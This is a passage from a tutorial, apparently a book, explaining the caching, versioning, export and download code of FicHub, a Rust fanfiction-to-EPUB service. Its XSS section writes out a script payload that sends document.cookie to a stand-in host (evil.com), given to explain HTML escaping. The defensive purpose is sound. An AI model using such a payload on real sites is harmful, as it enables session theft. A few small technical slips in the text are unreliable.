    let hash = Md5::digest(&data);
    Ok(hex::encode(hash))
}
```

This reads an entire file into memory, computes its MD5 hash, and returns the hex string. MD5 is used here not for security (MD5 is cryptographically broken), but as a fast fingerprint for cache invalidation.

### The Full Cache Path Lifecycle

Let's trace what happens when a fic is cached for the first time:

1. **Generate EPUB** → writes to `/tmp/uuid/output.epub`
2. **Compute MD5** → gets hash `abc123def456`
3. **Compute cache path** → `/cache/epub/abc/def/abcdef/abc123def456.epub`
4. **Move file** → `fs::rename()` from temp to cache (atomic on same filesystem)
5. **Record in database** → `INSERT INTO export_log (url_id, version, etype, input_hash, export_hash)`
6. **Clear stale** → remove any old EPUBs for this fic
7. **Return to caller** → the download URL is constructed from the cache path

The `fs::rename()` is key — it's an atomic operation on the same filesystem. The file either moves completely or not at all. There's never a state where half the file is in temp and half is in cache. This is critical for serving concurrent requests — a reader looking for the file won't find a partially-written file.

🧪 **Try It Yourself:** Write a function that generates a 3-character directory split for a given string. Test it with `"abc"`, `"abcdef"`, and `"abcdefghijklm"`. Verify the directory structure matches FicHub's output. Then test edge cases: empty string, 1 character, 2 characters.

---

## Chapter 32: Version Hashing

### Why Versioning Matters

Imagine FicHub changes how it generates EPUBs. Maybe the CSS gets better, or a bug in the introduction page is fixed. Suddenly, every cached EPUB is "wrong" — it was generated with the old code. How does FicHub know to regenerate them?

The answer is **version hashing** — a system that combines multiple version numbers into a single cache key.

Without versioning, you'd have to manually delete the entire cache directory every time you deploy new code. That's tedious, error-prone, and means all users hit the cold path (slow generation) simultaneously. Versioning makes invalidation automatic and gradual.

### The Three Versions

FicHub's `src/export/mod.rs` defines three version components:

```rust
/// Compute the version hash for a fic export.
///
/// `export_version`      – version of the export module itself (bumped on
///                          structural template/code changes)
/// `etype_version`       – version specific to the output format
/// `fic_version_bump`    – number of times the underlying fic data has been
///                          re-scraped / updated
pub fn compute_version(
    export_version: i32,
    etype_version: i32,
    fic_version_bump: i32,
) -> i32 {
    export_version + etype_version + fic_version_bump
}
```

Let's understand each one:

**1. `export_version`** — The global version of the export code. When FicHub updates how EPUBs are generated (new CSS, better HTML templates, bug fixes), this number goes up. It lives in the application configuration, typically set by the developer when they deploy new code.

**2. `etype_version`** — A version per export format. If FicHub improves the EPUB template but not the HTML template, only the EPUB version bumps. This is defined in the `etype_versions()` function:

```rust
pub fn etype_versions() -> HashMap<&'static str, i32> {
    let mut m = HashMap::new();
    m.insert(ETYPE_EPUB, 1);
    m.insert(ETYPE_HTML, 1);
    m.insert(ETYPE_MOBI, 0);
    m.insert(ETYPE_PDF, 0);
    m
}
```

**3. `fic_version_bump`** — The number of times this particular fic's data has been re-scraped. When an author updates a chapter, the scraper re-downloads the fic, and this counter goes up. This is stored per-fic in the database.

The sum of all three is the **version** used as part of the cache key:

```rust
let version_bump = queries::get_fic_version_bump(&state.db, &meta.url_id)
    .await?.unwrap_or(0);
let version = state.config.export_version + version_bump;
```

The `unwrap_or(0)` handles the case where the fic has never been version-bumped — it defaults to zero.

### How Versioning Invalidates Cache

When FicHub checks the cache, it doesn't just look for "an EPUB for this URL." It looks for "an EPUB for this URL *at this version*." The database query is conceptually:

```sql
SELECT * FROM export_log
WHERE url_id = $1 AND version = $2 AND etype = $3 AND input_hash = $4
```

If the version doesn't match, the cache is a miss, and FicHub regenerates the file.

Let's trace a scenario:

**Day 1:** FicHub version is 5. User requests fic "xyz". `compute_version(5, 1, 0) = 6`. EPUB is generated, cached, logged with version 6.

**Day 7:** Author updates the fic. `fic_version_bump` goes from 0 to 1. `compute_version(5, 1, 1) = 7`. Cache check fails (stored version 6 ≠ current version 7). FicHub regenerates.

**Day 14:** FicHub developer updates the EPUB CSS. `export_version` goes from 5 to 6. `compute_version(6, 1, 1) = 8`. All previous cache entries are stale. Everyone gets fresh EPUBs.

This is powerful because the invalidation is **automatic**. The developer doesn't need to clear caches manually. The version system handles it.

### Cache Key Composition

The full cache key is actually composed of several pieces:

- **version** — The sum from `compute_version()`
- **input_hash** — The content hash from the scraper (typically from `meta.content_hash`)
- **export_hash** — The MD5 of the generated file

The `input_hash` is especially important. It comes from the scraper's `content_hash` field, which changes whenever the upstream fic content changes. This means even without bumping the version number, FicHub can detect when a fic's content has changed.

```rust
let input_hash = meta.content_hash.clone()
    .unwrap_or_else(|| "upstream".to_string());
```

The fallback `"upstream"` is used when the scraper doesn't provide a content hash — it means "this is from the original source, we don't have a more specific hash."

### The Export Log

The database's `export_log` table ties everything together:

```rust
queries::insert_export_log(
    &state.db,
    &meta.url_id,      // which fic
    version,            // the computed version
    "epub",             // which format
    &input_hash,        // input content hash
    &epub_hash,         // output file hash
).await?;
```

Each row says: "For fic X, at version Y, in format Z, the input hash was A, and the output file hash was B." When checking the cache, FicHub queries this table first. If it finds a matching row, the cached file exists on disk. If not, it's time to regenerate.

### Version Bumps in Practice

Here's how the versions work in practice:

| Scenario | `export_version` | `etype_version` | `fic_version_bump` | Total |
|----------|:-:|:-:|:-:|:-:|
| Initial release | 5 | 1 | 0 | 6 |
| Author updates fic | 5 | 1 | 1 | 7 |
| Dev fixes EPUB CSS | 6 | 1 | 1 | 8 |
| Dev changes HTML template only | 6 | 1→2 | 1 | 9 |
| Another author update | 6 | 2 | 2 | 10 |

The beauty of this system is that each component is independent. You can bump the export version, the etype version, or the fic version independently, and they all flow into the same cache key.

### Why Not Just Use the Output Hash?

You might wonder: if we compute the MD5 of the generated file anyway, why not just use that as the cache key? If the output is the same, the hash is the same, so we'd skip regeneration.

The answer is **determinism**. The MD5 hash depends on the *entire* generated file, including timestamps, metadata, and formatting. Two generations of the same fic might produce slightly different EPUBs (different timestamp in the XHTML, different whitespace, different ordering of metadata) even if the content is identical. This would cause unnecessary cache invalidation.

For example, if you generate the same EPUB twice, the XHTML might include a different timestamp:

```xml
<!-- First generation -->
<title>My Story - Generated 2024-01-15</title>

<!-- Second generation -->
<title>My Story - Generated 2024-01-16</title>
```

The content is the same, but the MD5 hashes are different. Version numbers are **deterministic** — the same inputs always produce the same version number. This makes cache lookups reliable.

Version numbers also allow **intentional invalidation**. If the developer changes the CSS, they bump the `etype_version`. This forces regeneration even though the fic content hasn't changed. An output-hash-only system wouldn't know that the CSS changed — it would serve the old, unstyled EPUB.

🧪 **Try It Yourself:** Given `export_version=10`, `etype_version=2`, and `fic_version_bump=3`, compute the total version. Then trace what happens to the cache when `export_version` bumps to 11. How many fics would need to be regenerated?

⚠️ **Watch Out:** The version is a simple `i32`. If FicHub ever needs to differentiate between more than 2 billion versions (it won't), they'd need a larger type. But for practical purposes, `i32` is plenty. Even bumping the version once per deployment, every day, it would take over 5 million years to overflow.

---

## Chapter 33: The Export Handler

### The Full Flow

The export handler is the heart of FicHub's API. When someone visits the FicHub web interface and clicks "Download," this is the code that runs. It orchestrates everything — validation, scraping, caching, generation, and response building.

The handler is `epub_handler` in `src/routes/export.rs`:

```rust
pub async fn epub_handler(
    State(state): State<Arc<AppState>>,
    Query(params): Query<ExportQuery>,
) -> Result<Json<Value>, AppError> {
    let start = std::time::Instant::now();
    // ... entire flow ...
}
```

It starts a timer immediately — this measures the total request time for logging and analytics.

### Step 1: Validate Input

```rust
let query = params.q.as_deref().unwrap_or("");
if query.is_empty() {
    return Ok(Json(json!({ "err": -1, "msg": "no query", "q": "" })));
}

if params.automated.as_deref() == Some("true") {
    return Ok(Json(json!({ "err": -10, "msg": "automated requests blocked" })));
}
```

Two checks:

1. **Empty query** — Return error code -1 with a helpful message. The `as_deref()` converts `Option<String>` to `Option<&str>` without allocating.
2. **Automated flag** — If `?automated=true` is in the URL, reject the request. This prevents bots from hammering the API. The web interface never sets this flag, so real users are unaffected.

The error codes are negative integers that the frontend JavaScript checks. -1 means "missing input," -10 means "bot detected."

### Step 2: Find the Scraper

```rust
let scraper = state.scraper_registry.find_scraper(query)
    .ok_or_else(|| AppError::BadRequest(
        -5, format!("unsupported URL: {}", query)
    ))?;
```

The `scraper_registry` was set up in Part 4 of this book. It holds one scraper per fanfiction site (Archive of Our Own, FanFiction.net, etc.) and can match a URL to the right scraper. The registry pattern means adding support for a new site is as simple as implementing a scraper trait and registering it — no changes to the export handler needed.

The `ok_or_else()` converts `Option<Scraper>` to `Result<Scraper, AppError>`. The closure is lazy — it only formats the error message if the scraper is `None`, avoiding unnecessary string allocation on the happy path. This is a common Rust optimization: don't allocate an error string unless you're actually going to return an error.

### Step 3: Look Up Metadata

```rust
let meta = scraper.lookup(&state.http_client, query).await
    .map_err(|e| AppError::ScrapeError(e.to_string()))?;

let info_request_ms = start.elapsed().as_millis() as i32;
```

The `lookup()` call scrapes the story's metadata page. This is relatively fast — just one HTTP request. The elapsed time is recorded for analytics.

The `map_err()` converts the scraper's error type into FicHub's `AppError`. This is a common pattern in Rust: each module defines its own error type, and the caller converts at the boundary.

### Step 4: Upsert Fic Info in Database

```rust
let fic_info_row = FicInfo {
    id: meta.url_id.clone(),
    created: None,
    updated: None,
    title: meta.title.clone(),
    author: meta.author.clone(),
    // ... all fields ...
};
queries::upsert_fic_info(&state.db, &fic_info_row).await?;
```

The `upsert` (update or insert) ensures the fic's metadata is always current in FicHub's database. If the fic already exists, the fields are updated. If it's new, a row is inserted. This is the "write-behind" pattern — we write to the database asynchronously, without blocking the export.

### Step 5: Extract Tags

```rust
if let Ok(extracted_tags) = scraper.extract_tags(&state.http_client, query).await {
    for tag in &extracted_tags {
        if let Ok(resolution) = crate::tags::resolve::resolve_tag(
            &state.db, &tag.name, tag.tag_type_id,
        ).await {
            let _ = queries::upsert_fic_tag(
                &state.db, &meta.url_id, resolution.tag_id,
                &std::net::IpAddr::V4(std::net::Ipv4Addr::UNSPECIFIED),
            ).await;
        }
    }
}
```

This is the v3 tagging system in action. The scraper pulls tags from the source site (like "Harry Potter", "Angst", "Slow Burn"), and FicHub resolves them to known tags in its database. Note that tag failures are silently ignored with `let _ =` — tagging is best-effort, not critical. If tagging fails, the fic still gets exported.

The `IpAddr::V4(Ipv4Addr::UNSPECIFIED)` is the IP address `0.0.0.0` — since this is a system-initiated tag (not a user action), there's no real IP to record.

### Step 6: Check Blacklists

```rust
let fic_blacklist = queries::check_fic_blacklist(&state.db, &meta.url_id).await?;
if !fic_blacklist.is_empty() {
    if fic_blacklist.iter().any(|b| b.reason == 6) {
        return Ok(build_metadata_response(&meta, &[], &state.config.export_version, None, true));
    }
    if fic_blacklist.iter().any(|b| b.reason == 5 || b.reason == 7 || b.reason == 8) {
        return Ok(Json(json!({ "err": -7, "msg": "fic is blacklisted", "q": query })));
    }
}
```

FicHub has a two-tier blacklist system:

- **Reason 6 (greylist)** — The fic's metadata is shown, but download links are hidden. Used for fics that might be controversial but not harmful. The user can still see the title, author, and summary.
- **Reasons 5, 7, 8 (hard blacklist)** — The fic is completely blocked. Error code -7 is returned.

There's also an author blacklist check for authors who have been banned.

### Step 7: Compute Cache Version

```rust
let version_bump = queries::get_fic_version_bump(&state.db, &meta.url_id)
    .await?.unwrap_or(0);
let version = state.config.export_version + version_bump;

let input_hash = meta.content_hash.clone()
    .unwrap_or_else(|| "upstream".to_string());
```

### Cache Hit vs Cache Miss

This is the critical decision point:

```rust
let cached = queries::find_export_log(
    &state.db, &meta.url_id, version, "epub", &input_hash
).await?;

let mut urls = std::collections::HashMap::new();
let mut hashes = std::collections::HashMap::new();

if let Some(export_log) = cached {
    // CACHE HIT - build URLs from cached hash
    let epub_hash = &export_log.export_hash;
    hashes.insert("epub".to_string(), epub_hash.clone());
    urls.insert("epub".to_string(),
        format!("/cache/epub/{}?h={}", meta.url_id, epub_hash));

    // Also check other formats
    for etype_str in &["html", "mobi", "pdf"] {
        if let Ok(_etype) = etype_str.parse::<EType>() {
            let e_input_hash = format!("epub:{}", epub_hash);
            if let Ok(Some(entry)) = queries::find_export_log(
                &state.db, &meta.url_id, version, etype_str, &e_input_hash,
            ).await {
                hashes.insert(etype_str.to_string(), entry.export_hash.clone());
                urls.insert(etype_str.to_string(),
                    format!("/cache/{}/{}?h={}", etype_str, meta.url_id, entry.export_hash));
            }
        }
    }

    let slug = generate_slug(&meta.title, &meta.url_id);
    let (info_str, notes) = build_info_string(&meta);

    return Ok(Json(json!({
        "err": 0,
        "q": query,
        "urls": urls,
        "hashes": hashes,
        // ...
    })));
}
```

On a cache hit, the handler skips scraping, skips generation, and immediately returns download URLs. The entire cache-hit path takes about 5-10 milliseconds, compared to 2-5 seconds for a cold request.

The `?h=` parameter in each URL is the hash for cache-busting — we'll explore this in Chapter 34.

### The Semaphore Double-Check Pattern

On a cache miss, FicHub needs to generate the EPUB. But remember — concurrent requests for the same fic need to be serialized:

```rust
// Acquire semaphore
let sem = cache::get_export_semaphore(
    &state.cache_semaphores, &meta.url_id, &EType::Epub
).await;
let _permit = sem.acquire().await
    .map_err(|e| AppError::Internal(e.to_string()))?;

// DOUBLE-CHECK the cache
let cached = queries::find_export_log(
    &state.db, &meta.url_id, version, "epub", &input_hash
).await?;
if let Some(export_log) = cached {
    // Another request already generated it while we were waiting!
    let epub_hash = &export_log.export_hash;
    hashes.insert("epub".to_string(), epub_hash.clone());
    urls.insert("epub".to_string(),
        format!("/cache/epub/{}?h={}", meta.url_id, epub_hash));
    let slug = generate_slug(&meta.title, &meta.url_id);
    let (info_str, notes) = build_info_string(&meta);

    return Ok(Json(json!({
        "err": 0,
        "q": query,
        "urls": urls,
        "hashes": hashes,
        // ...
    })));
}
```

This is the **double-check pattern**. After acquiring the semaphore (which means we're the first request in line), we check the cache *one more time*. Why? Because while we were waiting for the semaphore, another request might have already generated the EPUB. Without this second check, we'd waste time regenerating something that already exists.

It's like checking if someone else already made the sandwich before you start cooking.

The `sem.acquire()` returns a `SemaphorePermit`. When this permit is dropped (at the end of the function, or when `_permit` goes out of scope), the semaphore is automatically released. This is Rust's RAII pattern — resource acquisition is initialization. No need to remember to release manually.

### Step 8: Generate the EPUB

```rust
// Fetch chapters from the source site
let chapters = scraper.fetch_chapters(&state.http_client, &meta).await
    .map_err(|e| AppError::ScrapeError(e.to_string()))?;

// Generate EPUB
let (epub_path, epub_hash) = export::epub::create_epub(
    &meta, &chapters, &state.config.tmp_dir
).await
    .map_err(|e| AppError::ExportError(e.to_string()))?;

// Move to cache
let cache_dest = cache::disk::cache_path(
    &state.config.cache_dir, &EType::Epub, &meta.url_id, &epub_hash
);
cache::disk::move_to_cache(&epub_path, &cache_dest)?;

// Record in database
queries::insert_export_log(
    &state.db, &meta.url_id, version, "epub",
    &input_hash, &epub_hash
).await?;
```

The pattern is always the same: **generate → move → record**. This three-step dance ensures:
1. The file is fully written before it's visible in the cache
2. The file is atomically moved (no partial files)
3. The database entry is created after the file exists on disk

### Step 9: Generate HTML Bundle (Also)

```rust
let (html_path, html_hash) = export::html_bundle::create_html_bundle(
    &meta, &chapters, &state.config.tmp_dir
).await
    .map_err(|e| AppError::ExportError(e.to_string()))?;
let html_cache_dest = cache::disk::cache_path(
    &state.config.cache_dir, &EType::Html, &meta.url_id, &html_hash
);
cache::disk::move_to_cache(&html_path, &html_cache_dest)?;
let html_input_hash = format!("epub:{}", epub_hash);
queries::insert_export_log(
    &state.db, &meta.url_id, version, "html",
    &html_input_hash, &html_hash
).await?;
```

Notice the `html_input_hash` — it's `"epub:"` prepended to the epub hash. This links the HTML bundle's version to the EPUB it was generated from. If the EPUB changes, the HTML bundle's input hash changes too, forcing regeneration.

### Step 10: Build the Response

The response is a JSON object with everything the frontend needs:

```rust
Ok(Json(json!({
    "err": 0,
    "q": query,
    "fixits": [],
    "info": info_str,
    "url_id": meta.url_id,
    "slug": slug,
    "meta": build_meta_json(&meta),
    "hashes": hashes,
    "urls": urls,
    "epub_url": urls.get("epub"),
    "html_url": urls.get("html"),
    "mobi_url": urls.get("mobi"),
    "pdf_url": urls.get("pdf"),
    "notes": notes,
})))
```

The `err: 0` means success. Non-zero values indicate various errors (-1 for no query, -5 for unsupported URL, -7 for blacklisted, -10 for automated requests).

### generate_slug

The slug is a URL-friendly version of the title:

```rust
pub fn generate_slug(title: &str, url_id: &str) -> String {
    let sanitized: String = title
        .chars()
        .map(|c| if c.is_alphanumeric() || c == '-' || c == '_' {
            c
        } else {
            '_'
        })
        .collect();
    let re = regex_lite::Regex::new(r"_+").unwrap();
    let slug = re.replace_all(&sanitized, "_").to_string();
    let slug = slug.trim_matches('_').to_string();
    format!("{}-{}", slug, url_id)
}
```

For "The Best Story" with url_id "abc123", this produces `The_Best_Story-abc123`. Special characters become underscores, consecutive underscores are collapsed, leading/trailing underscores are trimmed.

The slug is used for human-friendly download links. Instead of telling a user "your EPUB is at /cache/epub/abc123?h=def456", the frontend shows "The_Best_Story-abc123.epub".

### build_info_string

This function creates the human-readable info text shown to users:

```rust
pub fn build_info_string(meta: &FicMetadata) -> (String, Vec<String>) {
    let relative_time = {
        let now = chrono::Utc::now().timestamp_millis();
        let diff_ms = now - meta.updated;
        let diff_secs = diff_ms / 1000;
        if diff_secs < 60 {
            "less than a minute ago".to_string()
        } else if diff_secs < 3600 {
            format!("{} minutes ago", diff_secs / 60)
        } else if diff_secs < 86400 {
            format!("{} hours ago", diff_secs / 3600)
        } else {
            format!("{} days ago", diff_secs / 86400)
        }
    };

    let info = format!(
        "{title} by {author}\n{words} words in {chapters} chapters\n\
         Status: {status}\nUpdated: {date} - {relative} ago\n",
        title = meta.title,
        author = meta.author,
        words = meta.words,
        chapters = meta.chapters,
        status = meta.status,
        date = updated_str,
        relative = relative_time,
    );

    (info, Vec::new())
}
```

This produces friendly text like:

```
Harry Potter and the Methods of Rationality by LessWrong
666347 words in 122 chapters
Status: complete
Updated: 2024-01-15 14:30:00 - 45 days ago
```

The relative time calculation is simple but effective — it converts milliseconds to human-friendly units without any external library.

### build_meta_json

This function builds the metadata JSON object included in the API response:

```rust
pub fn build_meta_json(meta: &FicMetadata) -> Value {
    json!({
        "id": meta.url_id,
        "title": meta.title,
        "author": meta.author,
        "chapters": meta.chapters,
        "words": meta.words,
        "description": meta.desc,
        "status": meta.status,
        "source": meta.source,
        "created": chrono::DateTime::from_timestamp_millis(meta.published)
            .map(|d| d.to_rfc3339())
            .unwrap_or_default(),
        "updated": chrono::DateTime::from_timestamp_millis(meta.updated)
            .map(|d| d.to_rfc3339())
            .unwrap_or_default(),
    })
}
```

The dates are converted from millisecond timestamps to RFC 3339 format (ISO 8601), which is the standard format for API responses. The `unwrap_or_default()` returns an empty string if the timestamp is invalid.

The `serde_json::json!` macro is a powerful tool for building JSON objects in Rust. It handles string escaping, number formatting, and null values automatically. Without it, you'd need to manually construct a `serde_json::Value` tree, which is tedious and error-prone.

### The Full Response Structure

The JSON response from the export handler contains everything the frontend needs:

```json
{
    "err": 0,
    "q": "https://archiveofourown.org/works/123456",
    "fixits": [],
    "info": "My Story by Author\n50000 words in 10 chapters\nStatus: complete\nUpdated: 2024-01-15 - 45 days ago\n",
    "url_id": "abc123",
    "slug": "My_Story-abc123",
    "meta": { /* ... full metadata object ... */ },
    "hashes": {
        "epub": "def456",
        "html": "ghi789"
    },
    "urls": {
        "epub": "/cache/epub/abc123?h=def456",
        "html": "/cache/html/abc123?h=ghi789"
    },
    "epub_url": "/cache/epub/abc123?h=def456",
    "html_url": "/cache/html/abc123?h=ghi789",
    "mobi_url": null,
    "pdf_url": null,
    "notes": []
}
```

The `err` field is the first thing the frontend checks. If it's not 0, the frontend shows an error message. If it IS 0, the frontend extracts the download URLs and presents them as buttons.

The `urls` object and the individual `epub_url`, `html_url` fields are redundant — the individual fields are there for backward compatibility with older frontend code.

The `fixits` array is reserved for suggested corrections to the fic's metadata (like "this chapter title appears to be cut off"). It's currently always empty but could be populated by future scraping improvements.

The `notes` array contains informational messages like "This fic is greylisted — download links are not available." These are shown as non-blocking messages to the user.

🧪 **Try It Yourself:** Trace through the export handler for a cache hit scenario. What database queries are made? What HTTP responses are generated? How many times does the semaphore get acquired? How about for a cache miss?

⚠️ **Watch Out:** The `info_request_ms` timer captures the time from the start of the request, but the total `export_ms` timer also captures from the same start point. If you're measuring performance, make sure you're comparing the right metrics. The difference between `export_ms` and `info_request_ms` is the generation time.

---

## Chapter 34: Cache Download Routes

### Serving Cached Files

After the export handler generates and caches an EPUB, it returns download URLs like `/cache/epub/abcdef123?h=abc123def456`. But something needs to actually serve those files. That's what the cache download route does.

The route pattern is:

```
/cache/{etype}/{url_id}
```

When a user clicks the EPUB download button, their browser makes a request to this URL. FicHub then:

1. Parses the `etype` and `url_id` from the URL path
2. Looks up the hash from the database
3. Constructs the disk path using `cache::disk::cache_path()`
4. Reads the file from disk
5. Returns it with the correct Content-Type header

### The Content-Type Headers

Different file types need different Content-Type headers. Without the right header, a browser might try to display an EPUB as text or refuse to open it:

```rust
fn content_type_for_etype(etype: &EType) -> &'static str {
    match etype {
        EType::Epub => "application/epub+zip",
        EType::Html => "application/zip",
        EType::Mobi => "application/x-mobipocket-ebook",
        EType::Pdf => "application/pdf",
    }
}
```

The EPUB Content-Type `application/epub+zip` is particularly important. Many e-reader apps and browser extensions use it to detect when a download is an EPUB file and automatically offer to open it. Without this, the browser would download it as a generic ZIP file.

The `&'static str` return type means these strings are compile-time constants that live for the entire program. No heap allocation, no cleanup — just a pointer to static memory.

### Cache-Busting with Hash Parameter

Remember those `?h=abc123def456` parameters in the download URLs? Those aren't just for show — they serve a critical purpose: **cache busting**.

The hash is part of the *URL*, not just the file. This means:

1. When the EPUB is regenerated (new version, new content), the hash changes
2. The new URL is different from the old URL
3. CDNs and browsers don't serve the old file from their caches
4. Users always get the current version

Without cache-busting, a CDN might keep serving an old EPUB for hours after FicHub regenerated it. The hash parameter forces a cache miss at every layer.

Here's a concrete example:

```
# Original request
/cache/epub/abc123?h=aaa111bbb222

# After author updates fic
/cache/epub/abc123?h=ccc333ddd444
```

Same `url_id`, different hash → different URL → CDN fetches the new file.

### The Download Handler Flow

The handler follows a straightforward pattern:

1. **Parse the URL** — extract `etype` and `url_id`
2. **Query the database** — find the current export hash for this fic/format/version
3. **Verify the hash** — check that the `?h=` parameter matches the current hash
4. **Construct the path** — use `cache::disk::cache_path()` to build the filesystem path
5. **Serve the file** — read the file and return it with the right Content-Type

```rust
pub async fn download_with_hash(
    Path((etype_str, url_id)): Path<(String, String)>,
    Query(params): Query<HashQuery>,
    State(state): State<Arc<AppState>>,
) -> Result<impl IntoResponse, AppError> {
    let etype: EType = etype_str.parse()
        .map_err(|_| AppError::BadRequest(-5, "invalid format".into()))?;

    // Find the export hash from the database
    let version = /* compute version */;
    let export_log = queries::find_export_log(
        &state.db, &url_id, version, etype.as_str(), /* ... */
    ).await?;

    let export_log = export_log
        .ok_or_else(|| AppError::NotFound("not found".into()))?;

    // Verify the hash matches
    if let Some(ref h) = params.h {
        if h != &export_log.export_hash {
            return Err(AppError::BadRequest(-5, "hash mismatch".into()));
        }
    }

    // Build path and serve
    let path = cache::disk::cache_path(
        &state.config.cache_dir, &etype, &url_id, &export_log.export_hash
    );

    if !cache::disk::cache_file_exists(&path) {
        return Err(AppError::NotFound("file not found on disk".into()));
    }

    let content = fs::read(&path)?;
    let ct = content_type_for_etype(&etype);

    Ok(Response::builder()
        .header("Content-Type", ct)
        .header("Content-Length", content.len())
        .body(content)
        .unwrap())
}
```

The `impl IntoResponse` return type is Axum's way of saying "I'll return something that can be turned into an HTTP response." In this case, it's a `Response<Vec<u8>>` with headers.

### Why Verify the Hash?

You might wonder: if the database already knows the correct hash, why do we need the `?h=` parameter at all?

The answer is **CDN behavior**. Without the hash in the URL, a CDN might cache the file at `/cache/epub/abcdef123` indefinitely. When FicHub regenerates the file, the CDN doesn't know the file changed because the URL is the same. With the hash, every regeneration produces a new URL, forcing the CDN to fetch the fresh file.

It's the same principle that web apps use for cache-busting static assets (like `style.css?v=2` or `bundle.abc123.js`).

### The Database Query for Downloads

The download handler needs to look up the export log to find the current hash:

```rust
let export_log = queries::find_export_log(
    &state.db, &url_id, version, etype.as_str(), &input_hash
).await?;
```

This query is typically very fast because `export_log` is indexed on `(url_id, version, etype)`. Even under heavy load, this lookup takes microseconds.

### Error Cases

The download handler has several error paths:

1. **Invalid etype** — The URL has an unrecognized format. Returns -5 error.
2. **Not found in database** — The fic was never exported at this version. Returns 404.
3. **Hash mismatch** — The URL has an old or wrong hash. Returns -5 error.
4. **File not on disk** — The database says it's cached, but the file is missing. Maybe someone deleted the cache directory. Returns 404.

Each of these returns a different error message to help with debugging. The error codes follow FicHub's convention: negative integers for expected errors, with specific codes for specific failure modes. This makes it easy for the frontend to display appropriate messages.

### Rate Limiting Considerations

The download route is a potential bottleneck since it reads files from disk on every request. FicHub handles this through:

1. **CDN caching** — The hash-busted URLs mean CDNs cache files efficiently
2. **OS page cache** — Frequently accessed files stay in the OS's memory cache
3. **File system caching** — Modern file systems cache directory lookups

For most deployments, the bottleneck is never the file read itself — it's the database query. And since the `export_log` table is well-indexed, even that is fast.

### Multiple Export Types

The download route handles all four export types through the same code path. The `etype` parameter from the URL determines the Content-Type and file suffix:

```
/cache/epub/abc123?h=xxx   → application/epub+zip, file.epub
/cache/html/abc123?h=yyy   → application/zip, file.zip
/cache/mobi/abc123?h=zzz   → application/x-mobipocket-ebook, file.mobi
/cache/pdf/abc123?h=www    → application/pdf, file.pdf
```

The same `cache_path()` function handles all of them — the `EType` enum drives the directory and suffix selection.

🧪 **Try It Yourself:** Write a test that creates a fake export log entry, then verifies that the download handler correctly serves the cached file. Test the hash mismatch case too — what happens when you provide the wrong `?h=` parameter?

---

## Chapter 35: EPUB Generation Deep Dive

### HTML Escaping and XSS Prevention

We touched on `escape_html()` in Chapter 29, but let's go deeper. This function is FicHub's primary defense against **cross-site scripting (XSS)** attacks.

An XSS attack happens when user-controlled data gets inserted into HTML without escaping. For example, if a fic's title is:

```html
<script>window.location='https://evil.com/steal?cookie='+document.cookie</script>
```

Without escaping, this would execute JavaScript in anyone who opens the EPUB. The escaped version:

```html
&lt;script&gt;window.location=&#39;https://evil.com/steal?cookie=&#39;+document.cookie&lt;/script&gt;
```

This is just harmless text — no tags, no script execution.

In FicHub, the `escape_html()` function is applied to:

- **Title** — used in introduction page, chapter headings, HTML bundle
- **Author name** — same
- **Description** — same
- **Status** — same

It is NOT applied to `chapter.content` because that's already HTML from the scraper. The scraper is responsible for producing valid HTML. This is a trust boundary — FicHub trusts the scraper's output, but it doesn't trust metadata fields.

The order of replacements in `escape_html()` matters critically:

```rust
fn escape_html(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#39;")
}
```

The ampersand MUST be replaced first. If we replaced `<` before `&`, then the `&` in `&lt;` would be escaped again, producing `&amp;lt;` instead of the correct `&lt;`. This is a common bug in naive escaping implementations.

### MD5 Hashing for Cache Keys

FicHub uses MD5 to generate cache keys from generated files:

```rust
let epub_data = fs::read(&epub_path)?;
let md5_hex = Md5::digest(&epub_data)
    .iter()
    .map(|b| format!("{:02x}", b))
    .collect::<String>();
```

MD5 produces a 128-bit hash, represented as 32 hexadecimal characters. This is a *fingerprint* of the file — if even one byte changes, the hash changes completely.

Why MD5 specifically?

1. **Fast** — MD5 is one of the fastest hash algorithms. For a 1MB EPUB, MD5 takes microseconds.
2. **Short** — 32 chars is manageable for URLs and database columns. SHA-256 would be 64 chars.
3. **Avalanche effect** — Small input changes produce completely different hashes
4. **Not security-critical** — We're not using it for authentication or signatures, just for change detection
5. **Widely available** — The `md5` crate is mature and well-tested

⚠️ **Watch Out:** MD5 is NOT suitable for password hashing or digital signatures. For those purposes, use bcrypt, scrypt, or SHA-256. But for cache keys and file fingerprints where collision resistance isn't critical, MD5 is perfectly fine.

The `{:02x}` format specifier is important:
- `{:02x}` means lowercase hex with zero-padding to 2 digits
- `b` iterates over individual bytes
- Each byte becomes exactly 2 hex characters

So byte `0xFF` becomes `"ff"`, byte `0x0A` becomes `"0a"`, byte `0x00` becomes `"00"`.

### UUID Work Directories

Each export operation creates a unique work directory:

```rust
let uuid = Uuid::new_v4();
let work_dir = tmp_dir.join(uuid.to_string());
fs::create_dir_all(&work_dir)?;
```

UUIDs (Universally Unique Identifiers) are 128-bit numbers formatted as:

```
550e8400-e29b-41d4-a716-446655440000
```

Version 4 UUIDs are random, giving approximately 2^122 possible values. The chance of collision is astronomically small — you'd need to generate about 2^61 UUIDs (over a quintillion) before having a 50% chance of a duplicate.

Why not use the `url_id` as the work directory name? Because:

1. **Multiple concurrent requests** might need to generate for the same fic simultaneously
2. **Crash recovery** — if a previous generation crashed, the directory might still exist
3. **Uniqueness guarantee** — UUIDs provide absolute uniqueness without coordination

The work directory is created in a temporary directory (`tmp_dir`), which is typically `/tmp` or a dedicated temp volume. After the export is complete, the generated file is moved to the cache directory with `fs::rename()`, and the UUID work directory can be cleaned up.

### The ExportError Enum

FicHub's export system has its own error type that captures the different failure modes:

```rust
#[derive(Debug)]
pub enum ExportError {
    IoError(String),
    TemplateError(String),
    EpubError(String),
    CalibreError(String),
    ZipError(String),
}

impl std::fmt::Display for ExportError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ExportError::IoError(e) => write!(f, "IO error: {e}"),
            ExportError::TemplateError(e) => write!(f, "template error: {e}"),
            ExportError::EpubError(e) => write!(f, "EPUB error: {e}"),
            ExportError::CalibreError(e) => write!(f, "Calibre error: {e}"),
            ExportError::ZipError(e) => write!(f, "zip error: {e}"),
        }
    }
}
```

Each variant corresponds to a different failure mode:

- **IoError** — File system operations failed (disk full, permission denied, file not found)
- **TemplateError** — The HTML template had a formatting error (missing field, invalid format string)
- **EpubError** — The `epub-builder` crate failed (invalid content, ZIP error inside the builder)
- **CalibreError** — Calibre conversion failed (for MOBI/PDF generation)
